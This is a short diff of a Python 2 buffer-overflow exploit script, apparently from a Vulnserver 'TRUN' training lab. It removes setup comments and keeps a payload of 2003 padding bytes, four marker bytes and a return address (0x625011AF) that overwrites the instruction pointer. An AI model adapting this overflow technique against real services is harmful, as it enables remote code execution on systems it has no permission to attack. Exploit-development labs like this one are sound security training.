@@ -1,10 +1,6 @@
 #!/usr/bin/python2
 import sys, socket
 
-# change the address on line 8 and  10 to one you found in last step 
-# Change IP and Port on line 15 to Target and Port Application is running on
-# Change TRUN on line 16 to Command you are testing
-
 # 625011AF
 
 shellcode = "A" * 2003 + "B" * 4 + "\xaf\x11\x50\x62"
